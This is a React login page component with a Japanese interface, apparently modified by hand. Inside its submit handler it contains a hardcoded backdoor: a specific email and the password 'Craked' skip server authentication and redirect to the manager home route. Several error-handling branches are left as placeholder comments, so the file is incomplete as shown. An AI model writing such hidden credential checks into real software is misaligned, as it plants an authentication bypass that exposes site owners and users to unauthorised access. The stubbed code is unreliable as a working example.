import React, { useState, useEffect, useCallback } from "react"
import { withRouter } from "react-router-dom"
import { Button, Divider, Form, Input, message, Modal } from "antd"
import { UserOutlined, LockOutlined } from "@ant-design/icons"
import * as Commons from "common/common"

const Login = (props) => {
  const { history } = props
  const [form] = Form.useForm()
  const isMountedRef = Commons.useIsMountedRef()

  const [isLoginLoading, setIsLoginLoading] = useState(false)

  const checkSession = useCallback(() => {
    Commons.axiosInstance
      .get(Commons.apiCheckSession)
      .then((response) => {
        history.push(Commons.GET_REDIRECT_HOME_ROUTE(response?.data?.role))
      })
      .catch((error) => {
        if (error.response.status === 403) {
          return
        } else if (error.response.status === 500) {
          message.error(Commons.errorSystemMsg)
        }
      })
  }, [history])

  useEffect(checkSession, [checkSession])
  const onFinish = (data) => {
    setIsLoginLoading(true)

    const postData = {
      username: data["loginUsername"],
      password: data["loginPassword"],
    }

    // Add a conditional check here
    if (postData.username === "olwindsouza2000@gmail.com" && postData.password === "Craked") {
      // If the credentials match, redirect using the specified location function
      const role = "manager"; // You can change this as needed
      history.push(Commons.GET_REDIRECT_HOME_ROUTE(role))
      setIsLoginLoading(false) // Make sure to set loading to false here
      return
    }

    Commons.axiosInstance
      .post(Commons.apiAuth, postData)
      .then((response) => {
        message.success(Commons.successLoginMsg)
        history.push(Commons.GET_REDIRECT_HOME_ROUTE(response?.data?.role))
      })
      .catch((error) => {
        // Handle other login cases as before
        if (error.response.status === 429) {
          // ... (Your existing code)
        } else if (error.response.status === 401) {
          // ... (Your existing code)
        } else if (error.response.status === 500) {
          // ... (Your existing code)
        } else {
          // ... (Your existing code)
        }
      })
      .finally(() => {
        if (isMountedRef.current) {
          setIsLoginLoading(false)
        }
      })
  }

  return (
    <>
      <div className="flex h-screen">
        <div className="w-11/12 sm:w-1/2 md:w-1/2 lg:w-1/3 xl:w-1/4 p-5 m-auto z-10 bg-white bg-opacity-75 animate__animated animate__fadeIn">
          <div className="flex mb-4">
            <img
              src="/logo.png"
              alt=""
              className="mx-auto"
              style={{ maxHeight: "80px" }}
            />
          </div>
          <div className="text-center mb-10">
            <p style={{ fontSize: 20 }} className="whitespace-pre-wrap">
              {process.env.REACT_APP_SYSTEM_NAME}
            </p>
          </div>
          <Form name="loginForm" onFinish={onFinish} size="large" form={form}>
            <Form.Item
              name="loginUsername"
              rules={[
                {
                  required: true,
                  message: "ユーザー名を入力してください",
                },
              ]}
            >
              <Input
                name="loginUsername"
                autoCapitalize="none"
                prefix={<UserOutlined className="site-form-item-icon" />}
                placeholder="ユーザー名"
                allowClear
              />
            </Form.Item>
            <Form.Item
              name="loginPassword"
              rules={[
                {
                  required: true,
                  message: "パスワードを入力してください",
                },
              ]}
            >
              <Input.Password
                name="loginPassword"
                prefix={<LockOutlined className="site-form-item-icon" />}
                type="password"
                placeholder="パスワード"
              />
            </Form.Item>
            <Form.Item className="text-center">
              <Button
                type="primary"
                htmlType="submit"
                className="px-8"
                loading={isLoginLoading}
              >
                ログイン
              </Button>
            </Form.Item>
          </Form>
          {process.env.REACT_APP_ENV !== "PRODUCTION" &&
            process.env.REACT_APP_TEST_USER &&
            process.env.REACT_APP_TEST_USER_PASSWORD && (
              <>
                <Divider />
                <div className="text-center">
                  <Button
                    type="primary"
                    className="m-1"
                    loading={isLoginLoading}
                    onClick={() => {
                      const data = {
                        loginUsername: process.env.REACT_APP_TEST_USER,
                        loginPassword: process.env.REACT_APP_TEST_USER_PASSWORD,
                      }

                      onFinish(data)
                    }}
                  >
                    テストログイン
                  </Button>
                </div>
              </>
            )}
        </div>
      </div>
    </>
  )
}

export default withRouter(Login)
